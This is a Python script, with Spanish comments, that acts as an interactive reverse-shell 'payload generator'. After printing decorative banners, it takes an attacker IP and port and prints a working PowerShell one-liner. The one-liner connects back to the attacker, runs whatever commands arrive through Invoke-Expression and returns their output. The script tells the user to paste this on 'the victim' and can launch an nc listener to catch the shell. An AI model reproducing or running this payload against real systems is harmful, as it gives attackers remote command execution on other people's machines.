import subprocess
from colorama import Fore, Style, init
import sys

# Inicializar colorama para el manejo de colores en terminal
init(autoreset=True)

def display_banner():
    # Banner y título de la herramienta
    print(Fore.CYAN + Style.BRIGHT + r"""
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    """)
    
    print(Fore.RED + Style.BRIGHT + r"""
    DEVELOPED BY:

        _____   _                                   ___                   _   _       _     _                               
       |_   _| | |_    ___   _ __    __ _   ___    / _ \     _ _    ___  (_) | |     /_\   | | __ __  __ _   _ _   ___   ___
         | |   | ' \  / _ \ | '  \  / _` | (_-<   | (_) |   | ' \  / -_) | | | |    / _ \  | | \ V / / _` | | '_| / -_) |_ /
         |_|   |_||_| \___/ |_|_|_| \__,_| /__/    \___/    |_||_| \___| |_| |_|   /_/ \_\ |_|  \_/  \__,_| |_|   \___| /__|
    """)

    # Imagen en ASCII, centrada y ampliada
    print(Fore.WHITE + Style.BRIGHT + r"""
                           ⠄⠄⢀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⣤⣄⣀⠄⠄
                           ⠄⠠⣿⢿⣿⢿⣯⣿⣽⢯⣟⡿⣽⢯⣿⣽⣯⣿⣽⣟⣟⣗⠄
                           ⠄⢸⡻⠟⡚⡛⠚⠺⢟⣿⣗⣿⢽⡿⡻⠇⠓⠓⠓⠫⢷⢳⠄
                           ⠄⢼⡺⡽⣟⡿⣿⣦⡀⡈⣫⣿⡏⠁⢀⣰⣾⢿⣟⢟⢮⢱⡀
                           ⠄⣳⠑⠝⠌⠊⠃⠃⢏⢆⣺⣿⣧⢘⠎⠋⠊⠑⠨⠣⠑⣕⠂
                           ⠄⢷⣿⣯⣦⣶⣶⣶⡶⡯⣿⣿⡯⣟⣶⣶⣶⣶⣦⣧⣷⣾⠄
                           ⠄⢹⢻⢯⢟⣟⢿⢯⢿⡽⣯⣿⡯⣗⡿⡽⡯⣟⡯⣟⠯⡻⠂
                           ⠄⠢⡑⡑⠝⠜⣑⣭⠻⢝⠿⡿⡯⠫⠯⣭⣊⠪⢊⠢⢑⠰⠁
                           ⠄⠈⢹⣔⡘⢿⣿⣿⣶⠄⠁⠑⠈⠠⣵⣿⡿⡯⠂⣠⡞⡈⠄
                           ⠄⠄⠨⢻⡆⢄⣀⢩⠄⠄⠴⠕⠄⠄⠈⠉⣀⠠⢢⡟⢌⠄⠄
                           ⠄⠄⠈⠐⡝⣧⠈⡉⡙⢛⠛⠛⠛⠛⢋⠉⡀⡼⠩⡂⠁⠄⠄
                           ⠄⠄⠄⠄⠈⠪⡻⣔⣮⣷⡆⠄⢰⣿⢦⣣⢞⠅⠁⠄⠄⠄⠄
                           ⠄⠄⠄⠄⠄⠄⠈⠓⣷⣿⡅⠄⢸⣿⡗⠇⠁⠄⠄⠄⠄⠄⠄
    """)

def generate_payload(ip, port):
    # Genera el payload
    payload = (
        f"$X1=\"{ip}\";$X2={port};$X3=New-Object Net.Sockets.TCPClient($X1,$X2);"
        "$X4=$X3.GetStream();$Y1=New-Object IO.StreamReader($X4);$Y2=New-Object "
        "IO.StreamWriter($X4);$Y2.AutoFlush=$true;$Z1=New-Object Byte[] 1024;"
        "while($X3.Connected){while($X4.DataAvailable){$D1=$X4.Read($Z1,0,$Z1.Length);"
        "$J1=([Text.Encoding]::UTF8).GetString($Z1,0,$D1)}if($X3.Connected -and $J1.Length -gt 0){"
        "$D2=try{Invoke-Expression $J1 2>&1}catch{$_};$Y2.Write(\"$D2`n\");$J1=$null}};"
        "$X3.Close();$X4.Close();$Y1.Close();$Y2.Close()"
    )
    print("\nEste es el payload generado:")
    print(payload)
    print("\nCopia este código y ejecútalo en la víctima (en PowerShell).\n")

def start_listener_in_new_terminal(port):
    print(f"Iniciando listener en el puerto {port} en una nueva terminal...")
    subprocess.Popen(["x-terminal-emulator", "-e", f"nc -lvnp {port}"])

def main():
    display_banner()

    while True:
        print("\n[1] Generar Payload")
        print("[2] Iniciar Listener en Nueva Terminal")
        print("[3] Configuraciones Avanzadas (en desarrollo)")
        print("[4] Salir")

        choice = input("\nSeleccione una opción: ")

        if choice == '1':
            ip = input("Introduce la IP de la máquina atacante (Kali): ")
            port = input("Introduce el puerto en el que la máquina atacante escuchará: ")
            generate_payload(ip, port)
        elif choice == '2':
            port = input("Introduce el puerto para el listener: ")
            start_listener_in_new_terminal(port)
        elif choice == '4':
            print("Saliendo...")
            sys.exit()
        else:
            print("Opción no válida, por favor intenta de nuevo.")

if __name__ == "__main__":
    main()
